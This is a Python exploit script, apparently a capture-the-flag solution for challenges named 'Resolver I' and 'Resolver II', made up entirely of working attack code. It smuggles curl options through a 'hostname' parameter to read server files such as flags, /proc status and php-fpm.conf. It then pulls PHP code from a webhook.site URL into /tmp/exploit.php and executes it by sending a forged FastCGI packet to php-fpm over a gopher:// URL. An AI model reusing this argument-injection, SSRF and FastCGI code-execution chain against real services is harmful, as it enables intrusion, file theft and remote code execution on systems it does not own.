#!/usr/bin/env python3.7

import sys
import struct
import requests


IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
PORT = 7702

URL = f'http://{IP}:{PORT}/'


def build_fcgi_packet(params):
    def build_fcgi_data(d):
        data = []
        for k, v in d.items():
            data.append(bytes([len(k), len(v)]) + k.encode() + v.encode())
        return b''.join(data)

    def build_fcgi_record(id_, type_, data):
        return b''.join([
            b'\x01',
            bytes([type_]),
            struct.pack('>HH', id_, len(data)),
            bytes([len(data) % 8]),
            b'\x00',
            data,
            b'\x00' * (len(data) % 8)
        ])

    id_ = 1234

    return b''.join([
        build_fcgi_record(id_, 1, b'\x00\x01\x00\x00\x00\x00\x00\x00'),
        build_fcgi_record(id_, 4, build_fcgi_data(params)),
        build_fcgi_record(id_, 4, build_fcgi_data({}))
    ])


def escape(s):
    return ''.join(f'%{hex(x)[2:].zfill(2)}' for x in s)


def construct_gopher_url(socket, packet):
    return f'gopher://{socket}/?{escape(packet)}'


def read_file(filename):
    hostname = escape(f"@0.0.0.0 -p12345 -f {filename}".encode())
    response = requests.get(URL + f'?hostname={hostname}')
    data = []
    for line in response.text.split('\n'):
        if 'connection refused' in line:
            data.append(line[line.index(' for ')+len(' for '):line.index(' failed: ')])
    return data


def get_ppid(filename):
    data = read_file(filename)
    for i in range(len(data)):
        if data[i] == 'PPid:':
            return data[i + 1]


def curl_request(url, parse=False):
    hostname = escape(url.encode())
    response = requests.get(URL + f'?usecurl=1&hostname={hostname}')
    html = response.text
    if not parse:
        return html
    lines = html[html.index('<textarea'):html.index('</textarea>') + len('</textarea>')]
    return '\n'.join(lines.split('\n')[1:-1])


def get_source_code():
    flag1_path = '/tmp/flag.txt'
    print('first flag: ', read_file(flag1_path))

    # try index.php as most obvious php filename
    php_filename = '/var/resolver/index.php'
    print(' '.join(read_file(php_filename)), end='\n\n')


def read_php_fpm_config():
    ppid1 = int(get_ppid('/proc/self/status'))
    ppid2 = int(get_ppid('/proc/self/status'))
    print('ppids:', ppid1, ppid2, end='\n\n')
    
    next_pid = ppid2 + (ppid2 - ppid1)
    parent_ppid = int(get_ppid(f'/proc/{next_pid}/status'))
    
    data = read_file(f'/proc/{parent_ppid}/status')
    print('parent:', data[:2], end='\n\n')

    print('php-fpm.conf: ', ' '.join(read_file('/etc/php/7.4/fpm/php-fpm.conf')), end='\n\n')


def main():
    print('Resolver I')

    get_source_code()

    print('Resolver II')

    read_php_fpm_config()

    fpm_socket = '0.0.0.0:31337'

    # paste here custom url with PHP code in headers
    url = "https://webhook.site/5217b36d-91bd-4afc-a14d-d33e52ccc297"

    php_dir = '/tmp/'
    php_filename = f'{php_dir}exploit.php'

    curl_request(f'"{url}" -D "{php_filename}"')

    params = {
        'REQUEST_METHOD': 'GET',
        'SCRIPT_FILENAME': php_filename,
        'PHP_ADMIN_VALUE': f'open_basedir={php_dir}'
    }

    packet = build_fcgi_packet(params)
    url = construct_gopher_url(fpm_socket, packet)

    curl_request(url)
    
    # reading PHP code output from /tmp/result
    print(curl_request(f'file:///tmp/result', True))


if __name__ == '__main__':
    main()
